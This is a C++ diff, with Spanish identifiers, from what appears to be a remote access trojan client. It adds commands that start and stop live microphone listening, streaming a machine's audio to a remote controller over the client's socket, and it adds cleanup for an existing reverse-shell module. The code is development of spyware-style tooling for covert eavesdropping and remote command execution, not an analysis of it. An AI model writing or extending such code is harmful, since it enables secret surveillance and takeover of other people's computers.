@@ -73,6 +73,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 }
 
 void Cliente::MainLoop() {
+
     //Esperar por comandos
     char cBuffer[1024];
     memset(&cBuffer, 0, sizeof(cBuffer));
@@ -98,6 +99,18 @@ void Cliente::MainLoop() {
         //Partir maximo 50 parametros
         this->ProcesarComando(strSplit(cBuffer, '~', 50));
 
+    }
+
+    if (this->mod_Mic != nullptr) {
+        this->mod_Mic->m_DetenerLive();
+        delete this->mod_Mic;
+        this->mod_Mic = nullptr;
+    }
+
+    if (this->reverseSHELL != nullptr) {
+        this->reverseSHELL->TerminarShell();
+        delete this->reverseSHELL;
+        this->reverseSHELL = nullptr;
     }
 }
 
@@ -125,18 +138,33 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
 
     //Lista de dispositivos de entrada (mic)
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Refre_Dispositivos) {
-        if (this->mod_Mic != nullptr) {
-            delete this->mod_Mic;
-            this->mod_Mic = nullptr;
+        if (this->mod_Mic == nullptr) {
+            this->mod_Mic = new Mod_Mic(this);
         }
         
-        this->mod_Mic = new Mod_Mic(this);
         this->mod_Mic->sckSocket = this->sckSocket;
-        this->mod_Mic->Enviar_Dispositivos();
+        this->mod_Mic->m_Enviar_Dispositivos();
 
+    }
+
+    //Escuchar mic en tiempo real
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Iniciar_Escucha) {
+        if (this->mod_Mic == nullptr) {
+            this->mod_Mic = new Mod_Mic(this);
+        }
+        this->mod_Mic->sckSocket = this->sckSocket;
+        this->mod_Mic->m_EmpezarLive();
+    }
+
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Detener_Escucha) {
+        if (this->mod_Mic == nullptr) {
+            this->mod_Mic = new Mod_Mic(this);
+        }
+        this->mod_Mic->sckSocket = this->sckSocket;
+        this->mod_Mic->m_DetenerLive();
+        Sleep(100);
         delete this->mod_Mic;
         this->mod_Mic = nullptr;
-
     }
 
     //Iniciar shell
@@ -484,26 +512,4 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
         this->isRunning = false;
         lock.unlock();
     }
-}
-
-//Mod_Mic
-
-void Mod_Mic::Enviar_Dispositivos() {
-    std::vector<std::string> vc_devices = this->ObtenerDispositivos();
-    std::string strSalida = "";
-    
-    if (vc_devices.size() > 0) {
-        strSalida = std::to_string(EnumComandos::Mic_Refre_Resultado);
-        strSalida.append(1, '\\');
-        for (auto strDevice : vc_devices) {
-            strSalida += strDevice;
-            strSalida.append(1, '\\');
-        }
-        strSalida = strSalida.substr(0, strSalida.size() - 1);
-        this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
-    }else {
-        strSalida = "No hay dispositivos";
-    }
-
-    this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
 }
